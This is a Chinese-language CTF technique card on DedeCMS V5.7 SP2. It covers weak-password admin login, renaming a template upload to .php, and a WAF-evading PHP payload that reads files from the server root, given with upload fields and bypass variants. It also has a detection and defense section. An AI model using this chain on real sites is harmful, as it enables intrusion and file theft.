---
id: web-generic-file-upload-dedecms-template-rename-php-waf-fileread
title: DedeCMS 后台弱口令 + 模板管理上传改名 .php：WAF 拦截危险函数时用 scandir/array_rand 随机读根目录文件
type: scenario
domain: web
path: web/generic/file-upload
technique: dedecms-backend-template-upload-rename-waf-fileread
aliases:
- DedeCMS 模板上传 getshell
- 后台模板管理器改名 php
- DedeCMS 后台弱口令
- scandir array_rand WAF 绕过
- 无引号无参文件读取
tags:
- dedecms
- cms
- file-upload
- backend
- weak-password
- waf-bypass
- php
- file-read
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: DedeCMSV57_UTF8_SP2_118
verification:
  verified_by: verifier-V171
  verified_at: '2026-11-06T17:48:30+08:00'
  notes: 已读全文与 31 张本地图核对：DedeCMSV57_UTF8_SP2_118（图39 footer）、/dede/login.php、Aa123456789 弱口令、模板管理器 /include/dialog/select_templates.php、12.html 改名 1.php/2.php、/templates/ 可解析、WAF 拦截 phpinfo、scandir/array_rand 读根目录 payload 均一致；原文另有两张远程图未落盘；cards.json 的 id 已与卡一致；未本机复跑。
---

## 一句话结论

DedeCMS 后台（默认 `/dede/`）用弱口令登录后，“更新主页 HTML → 选择主页模板”的模板管理器带有上传点，可把 HTML 文件改名为 `.php` 落到 Web 可访问的 `/templates/` 并解析执行；当 WAF 拦截 `phpinfo/system` 等危险函数时，改用只含 `highlight_file/file_get_contents/array_rand/array_flip/scandir/dirname/chdir/chr` 的无引号 payload，随机读取根目录文件，多次访问即可读到 `/flag`。

## 原理

- **后台入口与弱口令**：DedeCMS 默认后台在 `/dede/login.php`（安装时未改目录名）；前台会员中心的“最近登录会员/欢迎新朋友”会显示其他用户名，攻击者由此获得管理员账号 `Aa123456789`，再用同名弱口令 `Aa123456789:Aa123456789` 登录后台。
- **模板管理器上传点**：后台“生成 → 更新主页 HTML”页面可选择主页模板，点“浏览”打开 `/include/dialog/select_templates.php` 模板管理器，当前目录 `/templates`，底部有上传控件和“改名”输入框。上传请求包含 `f=form1.templet`、`job=upload`、`uploadfile=12.html`、`filename=2.php`，服务端把上传文件按 `filename` 改名保存到 `/templates/`，没有扩展名白名单。
- **为什么能执行**：`/templates/` 位于 Web 根目录下且 PHP 处理器会解析 `.php`，上传的 `2.php` 直接被当作 PHP 执行，形成任意 PHP 代码执行。
- **WAF 拦截**：直接上传 `<?php phpinfo();?>` 时，服务端返回“当前上传的文件中存在恶意代码！”并回显被拦截的代码，说明 WAF 对危险函数/关键字做内容检测。
- **绕过思路**：不使用 `system/exec/eval/assert` 等危险函数，也不出现引号和 `flag` 字面量，只用文件/目录函数构造读取链：
  - `chr(47).chr(46).chr(46)` 拼出 `"/.."`，`dirname("/..")` 得到 `/`，`chdir("/")` 把当前目录切到根目录；
  - `chdir()` 返回 `true`，`dirname(true)` 被 PHP 转成 `dirname("1")` 即 `.`，`scandir(".")` 于是列出根目录；
  - `array_flip(scandir("."))` 把文件名变成键，`array_rand(...)` 随机取一个文件名，`file_get_contents(...)` 读取该文件；
  - 根目录下文件名随机命中 `/flag` 需要多次访问，属于概率性读取，但每次请求都会返回一个根目录文件的内容。
- **为什么成立**：WAF 只匹配常见危险函数与关键字，而 `scandir/array_rand/file_get_contents` 组合在语法上只是普通文件操作；`chdir` 改变进程当前目录后，相对路径读取不再受原始工作目录限制，从而能读到 Web 根目录之外的文件。

## 触发条件

- DedeCMS 后台目录可访问（默认 `/dede/` 或扫描得到），且管理员使用弱口令或用户名/密码可猜测。
- 后台“更新主页 HTML → 选择主页模板”的模板管理器上传功能可用，`filename` 参数可控且未限制扩展名。
- `/templates/` 在 Web 根目录内且允许 PHP 解析；上传目录没有独立 PHP 禁用策略。
- WAF 只检测明显危险函数/关键字，未拦截 `scandir/array_rand/file_get_contents` 等文件操作组合。
- 目标根目录下存在可读的 flag 文件。

## 利用步骤

1. 目录扫描发现 `/dede/login.php`（以及 `/phpmyadmin/`、`/uploads/`、`/data/` 等）；前台会员页/最近登录会员泄露管理员用户名。
2. 用弱口令登录 `/dede/login.php`，进入后台。
3. 打开“生成 → 更新主页 HTML”，选择主页模板后点“浏览”，进入 `/include/dialog/select_templates.php` 模板管理器。
4. 先上传一个普通 HTML（如 `12.html`），在“改名”填 `1.php` 并确定；访问 `/templates/1.php` 验证文件落地（内容是 HTML 时页面为空）。
5. 抓上传请求，把 `uploadfile` 内容改成 PHP 代码、`filename` 改成 `2.php`；若直接写 `<?php phpinfo();?>` 被 WAF 拦截，改用下面的文件读取 payload。
6. 提交后访问 `/templates/2.php`，多次刷新，直到随机读到的根目录文件为 `/flag`。

## PoC

上传请求关键字段（multipart/form-data）：

```text
f=form1.templet
job=upload
uploadfile=12.html        # 文件内容替换为下面的 PHP
filename=2.php
sb1=确定
```

WAF 绕过文件读取 payload：

```php
<?php
highlight_file(__FILE__);
var_dump(file_get_contents(array_rand(array_flip(scandir(dirname(chdir(dirname(chr(47).chr(46).chr(46)))))))));
?>
```

逐段解释：

```text
chr(47).chr(46).chr(46)            -> "/.."
dirname("/..")                     -> "/"
chdir("/")                         -> true（当前目录切到根）
dirname(true)                      -> "."
scandir(".")                       -> 根目录文件列表
array_flip(...)                    -> 文件名作为键
array_rand(...)                    -> 随机取一个文件名
file_get_contents(...)             -> 读取该文件
```

访问 `http://target/templates/2.php`，多次请求；命中 `/flag` 时页面返回 flag。

## 变体与关联

- 变体：若 `.php` 被拦截，可尝试 `.php5/.phtml/.pht` 或大小写/双扩展名；若 `/templates/` 禁止 PHP 解析，可改传 `.htaccess` 或寻找其他可写可执行目录。
- 变体：WAF 连 `file_get_contents` 也拦截时，可换 `readfile/show_source/highlight_file/include`，或用 `glob`/`DirectoryIterator` 列举；若有 open_basedir，可配合 `chdir`、`ini_set`、`glob://` 绕过。
- 变体：原文提到前台文章/图片上传点也未严格限制文件类型，其他选手直接上传 webshell 即拿到 flag；本卡保留后台模板上传这条更完整的链。
- 关联：[[web-php-rce-no-param-localeconv-scandir-chdir]]（同一类 `scandir/chdir` 无参文件读取思路）、[[web-php-rce-dedecms-field-tag-runphp-stored-injection]]（DedeCMS 另一条模板标签注入 RCE）、[[web-generic-file-upload-fastcms-template-upload-filename-traversal]]（CMS 后台模板上传文件名问题）、[[web-php-rce-joomla-admin-template-editor-webshell]]（后台模板编辑器写 PHP）。

## 检测与防御

- **账号安全**：修改默认后台目录、强制强口令、限制后台访问来源、启用登录失败锁定与验证码；不要在前台暴露管理员用户名。
- **上传限制**：模板管理器只允许模板扩展名（`.htm/.html/.tpl`），服务端按白名单校验，重命名时强制使用安全文件名；上传目录禁止 PHP 解析（Nginx `location ~ \.php$ { deny all; }` 或独立存储）。
- **WAF/内容检测**：对上传内容做语法级检测，不只看危险函数关键字；同时限制上传目录的脚本执行权限。
- **检测信号**：`/templates/` 下出现 `.php` 文件、上传请求 `filename` 含 `.php`、访问模板目录 PHP 文件、PHP 进程 `chdir("/")` 后读取根目录文件、短时间大量请求同一上传脚本。
- **加固**：及时升级 DedeCMS，删除不需要的后台功能；对文件读取函数做 `open_basedir` 限制到 Web 根目录。
